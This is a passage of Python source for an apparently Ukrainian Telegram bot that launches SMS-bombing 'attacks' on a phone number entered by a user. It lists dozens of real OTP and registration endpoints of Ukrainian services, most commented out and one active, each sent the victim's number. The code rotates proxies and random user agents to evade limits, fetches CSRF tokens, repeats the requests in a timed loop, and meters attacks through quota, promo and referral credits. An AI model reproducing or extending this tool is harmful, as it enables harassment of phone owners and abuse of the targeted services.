    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫
    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    if total_attacks <= 0:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –∞—Ç–∞–∫. –í–æ–Ω–∏ –≤—ñ–¥–Ω–æ–≤–ª—è—Ç—å—Å—è –∑–∞–≤—Ç—Ä–∞")
        return
    
    message_text = 'üéØ –ì–æ—Ç–æ–≤–∏–π –¥–æ –∞—Ç–∞–∫–∏!\n\nüí• –û—á—ñ–∫—É—é –Ω–∞ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É..'
    
    await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
    headers = {"User-Agent": fake_useragent.UserAgent().random}

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"–ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ CSRF-—Ç–æ–∫–µ–Ω: {e}")
        return

    logging.info(f"–û—Ç—Ä–∏–º–∞–Ω–æ CSRF-—Ç–æ–∫–µ–Ω: {csrf_token}")

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number9 = f"+{number[:2]} ({number[2:5]}) {number[5:8]}-{number[8:10]}-{number[10:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"

    logging.info(f"–ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–æ–º–µ—Ä {number}")

    async def send_request_and_log(url, **kwargs):
        method = kwargs.get('method', 'POST')
        start_time = asyncio.get_event_loop().time()
        
        try:
            if not attack_flags.get(chat_id):
                return
            
            timeout = aiohttp.ClientTimeout(total=5)
            
            # –î–µ—Ç–∞–ª—å–Ω–µ –ª–æ–≥—É–≤–∞–Ω–Ω—è –ø–µ—Ä–µ–¥ –∑–∞–ø–∏—Ç–æ–º
            domain = url.split('/')[2] if '/' in url else url
            logging.info(f"[REQUEST] {method} {domain} | URL: {url[:100]}...")
            if kwargs.get('data'):
                logging.debug(f"[REQUEST DATA] {domain}: {str(kwargs['data'])[:200]}...")
            if kwargs.get('json'):
                logging.debug(f"[REQUEST JSON] {domain}: {str(kwargs['json'])[:200]}...")
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                method = kwargs.pop('method', 'POST')
                # sanitize encodings to avoid brotli dependency
                hdrs = kwargs.get('headers') or {}
                try:
                    hdrs['Accept-Encoding'] = 'gzip, deflate'
                except Exception:
                    pass
                kwargs['headers'] = hdrs
                
                async with session.request(method, url, **kwargs) as response:
                    elapsed_time = asyncio.get_event_loop().time() - start_time
                    
                    try:
                        response_text = await response.text()
                        response_preview = response_text[:500] if len(response_text) > 500 else response_text
                    except Exception as e:
                        response_preview = f"[–ù–µ –≤–¥–∞–ª–æ—Å—è –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å: {e}]"
                    
                    # –î–µ—Ç–∞–ª—å–Ω–µ –ª–æ–≥—É–≤–∞–Ω–Ω—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É
                    if response.status == 200:
                        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º—ñ—Å—Ç–∏—Ç—å –æ–∑–Ω–∞–∫–∏ —É—Å–ø—ñ—à–Ω–æ—ó –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ SMS
                        sms_sent_indicators = ['sent', 'success', '–æ–∫', '—É—Å–ø—ñ—à–Ω–æ', 'sms', 'code sent', '–æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ', '–æ—Ç–ø—Ä–∞–≤–ª–µ–Ω']
                        response_lower = response_preview.lower()
                        sms_confirmed = any(indicator in response_lower for indicator in sms_sent_indicators)
                        
                        if sms_confirmed:
                            logging.info(f"[SUCCESS ‚úÖ SMS] {domain} | –°—Ç–∞—Ç—É—Å: {response.status} | –ß–∞—Å: {elapsed_time:.2f}s | –ù–æ–º–µ—Ä: {number}")
                        else:
                            logging.info(f"[SUCCESS ‚ö†Ô∏è] {domain} | –°—Ç–∞—Ç—É—Å: {response.status} | –ß–∞—Å: {elapsed_time:.2f}s | –ù–æ–º–µ—Ä: {number} | SMS –Ω–µ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ")
                        logging.debug(f"[RESPONSE] {domain} | –í—ñ–¥–ø–æ–≤—ñ–¥—å: {response_preview}")
                    # –î–µ—Ç–∞–ª—å–Ω–µ –ª–æ–≥—É–≤–∞–Ω–Ω—è –Ω–µ—É—Å–ø—ñ—à–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É
                    else:
                        logging.warning(f"[FAILED] {domain} | –°—Ç–∞—Ç—É—Å: {response.status} | –ß–∞—Å: {elapsed_time:.2f}s | –ù–æ–º–µ—Ä: {number}")
                        logging.debug(f"[RESPONSE] {domain} | –°—Ç–∞—Ç—É—Å: {response.status} | –í—ñ–¥–ø–æ–≤—ñ–¥—å: {response_preview}")
                        
        except asyncio.TimeoutError:
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            logging.error(f"[TIMEOUT] {domain} | –ß–∞—Å: {elapsed_time:.2f}s | URL: {url[:100]}... | –ù–æ–º–µ—Ä: {number}")
            
        except aiohttp.ClientError as e:
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            logging.error(f"[CLIENT_ERROR] {domain} | –ß–∞—Å: {elapsed_time:.2f}s | –ü–æ–º–∏–ª–∫–∞: {str(e)} | URL: {url[:100]}... | –ù–æ–º–µ—Ä: {number}")
            
        except Exception as e:
            elapsed_time = asyncio.get_event_loop().time() - start_time
            domain = url.split('/')[2] if '/' in url else url
            logging.error(f"[ERROR] {domain} | –ß–∞—Å: {elapsed_time:.2f}s | –ü–æ–º–∏–ª–∫–∞: {str(e)} | –¢–∏–ø: {type(e).__name__} | URL: {url[:100]}... | –ù–æ–º–µ—Ä: {number}")

    semaphore = asyncio.Semaphore(3)  # –ó–º–µ–Ω—à–µ–Ω–æ –¥–æ 3 –æ–¥–Ω–æ—á–∞—Å–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤

    async def bounded_request(url, **kwargs):
        if not attack_flags.get(chat_id):
            return
        async with semaphore:
            await send_request_and_log(url, **kwargs)

    # Helper: attach fixed proxy for this iteration
    def with_proxy(kwargs):
        if proxy_url:
            kwargs.update({"proxy": proxy_url, "proxy_auth": proxy_auth})
        return kwargs

    # –§—É–Ω–∫—Ü—ñ—è –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –º–∞—Å–∏–≤—É –∑–∞–ø–∏—Ç—ñ–≤ (—â–æ–± –º–æ–∂–Ω–∞ –±—É–ª–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –¥–≤—ñ—á—ñ)
    def create_requests():
        # –ì–µ–Ω–µ—Ä—É—î–º–æ device_id —Ç–∞ fingerprint –¥–ª—è monto (–æ–¥–Ω–∞–∫–æ–≤—ñ –¥–ª—è –æ–¥–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É)
        monto_device_id = str(uuid.uuid4())
        monto_fingerprint = monto_device_id  # –í–æ–Ω–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ –≤ –ø—Ä–∏–∫–ª–∞–¥—ñ
        
        return [
            # bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
            # bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
            # bounded_request("https://auth.multiplex.ua/login", **with_proxy({"json": {"login": "+" + number}, "headers": headers})),
            # bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", **with_proxy({"json": {"applicationSend": "sms", "lang": "uk", "phone": number}, "headers": headers})),
            # bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", **with_proxy({"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers})),
            # bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
            # bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", **with_proxy({"json": {"phone": formatted_number, "type": ""}, "headers": headers})),
            # bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
            # bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
            # bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
            # bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
            # bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
            # bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "–¥–µ–Ω—è", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
            # bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "–¥–µ–Ω—è", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
            # bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
            # bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", **with_proxy({"data": {"firstname": "–¥–µ–Ω—è", "lastname": "–¥–µ–Ω–µ–≤–∏—á", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape})),
            # bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
            # bounded_request("https://www.moyo.ua/identity/registration", **with_proxy({"data": {"firstname": "–¥–µ–Ω—è", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo})),
            # bounded_request("https://pizza.od.ua/ajax/reg.php", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
            # bounded_request("https://sushiya.ua/ru/api/v1/user/auth", **with_proxy({"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya})),
            # bounded_request("https://avrora.ua/index.php?dispatch=otp.send", **with_proxy({"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers})),
            # bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", **with_proxy({"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota})),
            # bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", **with_proxy({"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "–¥–µ–Ω—è", "RegistrationForm[second_name]": "–¥–µ–Ω–µ–≤–∏—á", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria})),
            # bounded_request(f"https://ukrpas.ua/login?phone=+{number}", **with_proxy({"method": 'GET', "headers": headers})),
            # bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", **with_proxy({"data": {"phone": formatted_number6}, "headers": headers})),
            # bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
            # bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", **with_proxy({"data": {"telephone": formatted_number7}, "headers": headers})),
            # bounded_request("https://api.iqos.com.ua/v1/auth/otp", **with_proxy({"json": {"phone": number}, "headers": headers})),
            # bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", **with_proxy({"method": 'POST', "headers": headers})),
            # bounded_request("https://api-mobile.planetakino.ua/graphql", **with_proxy({"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, "headers": headers})),
            # bounded_request("https://back.trofim.com.ua/api/via-phone-number", **with_proxy({"json": {"phone": number}, "headers": headers})),
            # bounded_request("https://dracula.robota.ua/?q=SendOtpCode", **with_proxy({"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, "headers": headers})),
            # bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", **with_proxy({"method": 'GET', "headers": headers})),
            # bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
            # bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
            # bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
            # bounded_request("https://ucb.z.apteka24.ua/api/send/otp", **with_proxy({"json": {"phone": number}, "headers": headers_apteka24})),
            # bounded_request("https://api.ta-da.net.ua/v1.1/mobile/user.auth", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da})),
            # bounded_request("https://mobilebanking.monto.com.ua/api-web/v1/authorization", **with_proxy({"json": {"form_id": "get_login", "login": number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto})),
            bounded_request("https://smartmedicalcenter.ua/health/", **with_proxy({"data": {"auth_login": number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical})),
        ]

    if not attack_flags.get(chat_id):
        return
    
    # –°—Ç–≤–æ—Ä—é—î–º–æ —ñ –≤–∏–∫–æ–Ω—É—î–º–æ –≤—Å—ñ –∑–∞–ø–∏—Ç–∏ –æ–¥–∏–Ω —Ä–∞–∑
    requests_batch = create_requests()
    if requests_batch:
        logging.info(f"–ó–∞–ø—É—Å–∫–∞—é –∞—Ç–∞–∫—É ({len(requests_batch)} –∑–∞–ø–∏—Ç—ñ–≤)")
        await asyncio.gather(*requests_batch, return_exceptions=True)
        logging.info("–ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
    else:
        logging.warning("–°–ø–∏—Å–æ–∫ –∑–∞–ø–∏—Ç—ñ–≤ –ø–æ—Ä–æ–∂–Ω—ñ–π!")

async def start_attack(number, chat_id):
    global attack_flags
    attack_flags[chat_id] = True
    
    timeout = 100
    start_time = asyncio.get_event_loop().time()

    try:
        await check_and_update_proxies()
        snapshot = proxies_healthy.copy()
        # choose least-used proxy (then by lower latency) for the whole attack session
        p_url = None
        p_auth = None
        if snapshot:
            try:
                # map latency by key
                lat_by_key = {}
                for item in proxies_stats:
                    e = item['entry']
                    lat_by_key[proxy_key(e)] = item.get('latency_ms', 999999)
                # select min by (usage, latency)
                best_entry = min(
                    snapshot,
                    key=lambda e: (proxies_usage.get(proxy_key(e), 0), lat_by_key.get(proxy_key(e), 999999))
                )
                key = proxy_key(best_entry)
                proxies_usage[key] = proxies_usage.get(key, 0) + 1
                p_url, p_auth = build_proxy_params(best_entry)
                logging.info(f"Using proxy for attack: {best_entry['host']}:{best_entry['port']}")
            except Exception:
                p_url, p_auth = None, None
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            if not attack_flags.get(chat_id):
                logging.info(f"–ê—Ç–∞–∫—É –Ω–∞ –Ω–æ–º–µ—Ä {number} –∑—É–ø–∏–Ω–µ–Ω–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.")
                try:
                    msg_id = last_status_msg.get(chat_id)
                    if msg_id:
                        await bot.edit_message_text("üõë –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.", chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
                return
            
            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth)
            
            if not attack_flags.get(chat_id):
                logging.info(f"–ê—Ç–∞–∫—É –Ω–∞ –Ω–æ–º–µ—Ä {number} –∑—É–ø–∏–Ω–µ–Ω–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.")
                try:
                    msg_id = last_status_msg.get(chat_id)
                    if msg_id:
                        await bot.edit_message_text("üõë –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.", chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
                return
            await asyncio.sleep(10.0)  # –ó–∞—Ç—Ä–∏–º–∫–∞ 10 —Å–µ–∫—É–Ω–¥ –º—ñ–∂ —Ü–∏–∫–ª–∞–º–∏ (–ø—ñ—Å–ª—è –ø–æ–≤–Ω–æ–≥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –∞—Ç–∞–∫–∏)
            
    except asyncio.CancelledError:
        try:
            msg_id = last_status_msg.get(chat_id)
            if msg_id:
                await bot.edit_message_text("üõë –ê—Ç–∞–∫–∞ –∑—É–ø–∏–Ω–µ–Ω–∞.", chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∞—Ç–∞–∫–∏: {e}")
        await bot.send_message(chat_id, "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∞—Ç–∞–∫–∏.")
    finally:
        attack_flags[chat_id] = False
        # –í–∏–¥–∞–ª—è—î–º–æ –∞–∫—Ç–∏–≤–Ω—É –∞—Ç–∞–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
        active_attacks.pop(chat_id, None)

    logging.info(f"–ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä {number} –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
    
    async with db_pool.acquire() as conn:
        user_data = await conn.fetchrow(
            'SELECT attacks_left, promo_attacks, referral_attacks FROM users WHERE user_id = $1',
            chat_id
        )
    attacks_left = user_data['attacks_left'] if user_data else 0
    promo_attacks = user_data['promo_attacks'] if user_data else 0
    referral_attacks = user_data['referral_attacks'] if user_data and 'referral_attacks' in user_data else 0
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='üé™ –ö–∞–Ω–∞–ª', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=f"""üëç –ê—Ç–∞–∫–∞ –Ω–∞ –Ω–æ–º–µ—Ä <i>{number}</i> –∑–∞–≤–µ—Ä—à–µ–Ω–∞!

üî• –°–ø–æ–¥–æ–±–∞–ª–∞—Å—å —Ä–æ–±–æ—Ç–∞ –±–æ—Ç–∞? 
–î–æ–ø–æ–º–æ–∂–∏ –Ω–∞–º –∑—Ä–æ—Å—Ç–∞—Ç–∏ ‚Äî –∑–∞–ø—Ä–æ—Å–∏ –¥—Ä—É–≥–∞!

üí¨ –Ø–∫—â–æ —î –ø–∏—Ç–∞–Ω–Ω—è –∞–±–æ –ø—Ä–æ–ø–æ–∑–∏—Ü—ñ—ó, –∑–≤–µ—Ä—Ç–∞–π—Å—è –¥–æ @Nobysss

–ü—Ä–∏—î–¥–Ω—É–π—Å—è –¥–æ –Ω–∞—à–æ–≥–æ –∫–æ–º'—é–Ω—ñ—Ç—ñ üëá""",
                parse_mode="html"
            )
    except Exception:
        pass

@dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message, state: FSMContext = None):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –≥—Ä—É–ø
    
    # –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤ —Å—Ç–∞–Ω—ñ FSM - –Ω–µ –æ–±—Ä–æ–±–ª—è—î–º–æ –Ω–æ–º–µ—Ä (–¥–∞—î–º–æ –æ–±—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à–∏–º –æ–±—Ä–æ–±–Ω–∏–∫–∞–º)
    # –û—Ç—Ä–∏–º—É—î–º–æ –ø–æ—Ç–æ—á–Ω–∏–π —Å—Ç–∞–Ω
    current_state = None
    if state:
        current_state = await state.get_state()
    else:
        # –Ø–∫—â–æ state –Ω–µ –ø–µ—Ä–µ–¥–∞–Ω–æ, —Å—Ç–≤–æ—Ä—é—î–º–æ –Ω–æ–≤–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å—Ç–∞–Ω—É
        temp_state = FSMContext(storage=dp.storage, chat=message.chat.id, user=message.from_user.id)
        current_state = await temp_state.get_state()
    
    if current_state:
        return  # –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤ —Å—Ç–∞–Ω—ñ FSM, –Ω–µ –æ–±—Ä–æ–±–ª—è—î–º–æ —è–∫ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É
    
    # –Ü–≥–Ω–æ—Ä—É—î–º–æ —Ç–µ–∫—Å—Ç –∫–Ω–æ–ø–æ–∫
    button_texts = ['üÜò –î–æ–ø–æ–º–æ–≥–∞', 'üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞', 'üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É', '‚ùì –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∞—Ç–∞–∫–∏', 'üéÅ –£ –º–µ–Ω–µ —î –ø—Ä–æ–º–æ–∫–æ–¥']
    if message.text in button_texts:
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("–ü–æ–º–∏–ª–∫–∞: –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.")
        return

    if result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        async with db_pool.acquire() as conn:
            is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"–ù–æ–º–µ—Ä <i>{number}</i> –∑–∞—Ö–∏—â–µ–Ω–∏–π –≤—ñ–¥ –∞—Ç–∞–∫–∏.", parse_mode="html")
            return

        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —Ç–∞ –∑–º–µ–Ω—à—É—î–º–æ –∞—Ç–∞–∫–∏
        async with db_pool.acquire() as conn:
            user_data = await conn.fetchrow(
                'SELECT attacks_left, promo_attacks, referral_attacks FROM users WHERE user_id = $1',
                user_id
            )
            
            if not user_data:
                await message.answer("–ü–æ–º–∏–ª–∫–∞: –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.")
                return
            
            attacks_left = user_data['attacks_left'] if user_data['attacks_left'] is not None else 0
            promo_attacks = user_data['promo_attacks'] if user_data['promo_attacks'] is not None else 0
            referral_attacks = user_data['referral_attacks'] if user_data['referral_attacks'] is not None else 0
            total_attacks = attacks_left + promo_attacks + referral_attacks
            
            logging.info(f"–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∞—Ç–∞–∫ –¥–ª—è user_id={user_id}: attacks_left={attacks_left}, promo_attacks={promo_attacks}, referral_attacks={referral_attacks}, total={total_attacks}")
            
            if total_attacks <= 0:
                await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –∞—Ç–∞–∫. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤–∞—à—ñ –∞—Ç–∞–∫–∏ –∫–æ–º–∞–Ω–¥–æ—é ‚ùì –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∞—Ç–∞–∫–∏")
                return
            
            # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ –Ω–µ–º–∞—î –≤–∂–µ –∞–∫—Ç–∏–≤–Ω–æ—ó –∞—Ç–∞–∫–∏ –¥–ª—è —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–≤ private —á–∞—Ç–∞—Ö chat_id == user_id)
            if active_attacks.get(chat_id, False):
                await message.answer("‚è≥ –£ –≤–∞—Å –≤–∂–µ –∞–∫—Ç–∏–≤–Ω–∞ –∞—Ç–∞–∫–∞. –ó–∞—á–µ–∫–∞–π—Ç–µ –ø–æ–∫–∏ –≤–æ–Ω–∞ –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è –∞–±–æ –∑—É–ø–∏–Ω—ñ—Ç—å —ó—ó.")
                return
            
            # –ó–º–µ–Ω—à—É—î–º–æ –∞—Ç–∞–∫–∏: —Å–ø–æ—á–∞—Ç–∫—É —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ, –ø–æ—Ç—ñ–º –ø—Ä–æ–º–æ, –ø–æ—Ç—ñ–º –∑–≤–∏—á–∞–π–Ω—ñ
            if referral_attacks > 0:
                await conn.execute(
                    'UPDATE users SET referral_attacks = GREATEST(0, COALESCE(referral_attacks, 0) - 1), last_attack_date = $1 WHERE user_id = $2',
                    get_kyiv_datetime(), user_id
                )
                # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —â–æ –∑–º—ñ–Ω–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–ª–∏—Å—è
                new_value = await conn.fetchval('SELECT referral_attacks FROM users WHERE user_id = $1', user_id)
